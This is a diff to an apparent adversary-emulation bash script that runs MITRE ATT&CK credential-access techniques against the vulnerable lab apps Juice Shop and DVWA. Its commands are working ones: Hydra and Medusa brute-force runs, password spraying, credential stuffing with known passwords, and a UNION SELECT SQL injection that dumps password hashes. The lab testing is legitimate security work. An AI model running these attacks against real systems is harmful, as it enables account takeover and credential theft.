@@ -15,24 +15,24 @@ echo "=== T1110.001: Brute Force — Password Guessing ==="
 echo "    Technique: Automated password guessing against login endpoints"
 
 echo "  [T1110.001.a] Hydra against Juice Shop REST API:"
-echo "admin@juice-sh.op" >/tmp/mitre-users-$$.txt
+echo "admin@example.com" >/tmp/mitre-users-$$.txt
 hydra -L /tmp/mitre-users-$$.txt \
   -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
-  "$TARGET" http-post-form \
-  "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid:H=Content-Type\: application/json" \
-  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | head -5
+  -s 443 "$TARGET" https-post-form \
+  "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=Invalid" \
+  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | sed -n '1,5p'
 echo ""
 
 echo "  [T1110.001.b] Medusa against DVWA:"
 medusa -h "$TARGET" -u admin -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
-  -M http -m "DIR:/dvwa/login.php" -n 80 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | head -5
+  -M http -m "DIR:dvwa/login.php" -n 443 -s -m USER-AGENT:Medusa/2.2 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | sed -n '1,5p'
 echo ""
 
 echo "=== T1110.003: Brute Force — Password Spraying ==="
 echo "    Technique: One password against many usernames"
 SPRAY_PASS="admin123"
 echo "  Spraying '${SPRAY_PASS}' against known Juice Shop accounts:"
-for user in "admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op" "mc.safesearch@juice-sh.op" "ciso@juice-sh.op"; do
+for user in "admin@example.com" "jim@example.com" "bender@example.com" "mc.safesearch@example.com" "ciso@example.com"; do
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
     -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${SPRAY_PASS}\"}" --max-time 10) || code="ERR"
   tag="[SAFE]"
@@ -44,11 +44,11 @@ echo ""
 echo "=== T1110.004: Brute Force — Credential Stuffing ==="
 echo "    Technique: Testing leaked credential pairs"
 CRED_PAIRS=(
-  "admin@juice-sh.op:admin123"
-  "jim@juice-sh.op:ncc-1701"
-  "bender@juice-sh.op:OhG0dPlease1nsique"
-  "mc.safesearch@juice-sh.op:Mr. N00dles"
-  "admin@juice-sh.op:password"
+  "admin@example.com:admin123"
+  "jim@example.com:ncc-1701"
+  "bender@example.com:OhG0dPlease1nsique"
+  "mc.safesearch@example.com:Mr. N00dles"
+  "admin@example.com:password"
 )
 for pair in "${CRED_PAIRS[@]}"; do
   user="${pair%%:*}"
@@ -76,7 +76,7 @@ echo "    Technique: SQLi to extract password hashes"
 resp=$(curl -sf "${BASE}/juice-shop/rest/products/search?q=test'))UNION+SELECT+id,email,password,'4','5','6','7','8','9'+FROM+Users--" --max-time 10 2>/dev/null)
 if echo "$resp" | grep -qiE "(\\\$2[aby]|md5|[a-f0-9]{32})" 2>/dev/null; then
   echo "  [VULN] T1212 Password hashes extracted via UNION SELECT"
-  echo "$resp" | jq -r '.data[]? | "\(.email // .id): \(.password // "N/A")"' 2>/dev/null | head -5
+  echo "$resp" | jq -r '.data[]? | "\(.email // .id): \(.password // "N/A")"' 2>/dev/null | sed -n '1,5p'
 else
   printf '  [INFO] T1212 UNION SELECT attempted (response: %sB)\n' "${#resp}"
 fi
@@ -85,7 +85,7 @@ echo ""
 echo "=== T1539: Steal Web Session Cookie ==="
 echo "    Technique: Session fixation and cookie analysis"
 echo "  DVWA session cookie analysis:"
-curl -sf -v "${BASE}/dvwa/login.php" 2>&1 | grep -i "set-cookie" | head -3
+curl -sf -v "${BASE}/dvwa/login.php" 2>&1 | grep -i "set-cookie" | sed -n '1,3p'
 echo ""
 echo "  Cookie security flags check:"
 curl -sf -I "${BASE}/dvwa/login.php" 2>/dev/null | grep -i "set-cookie" | while read -r line; do
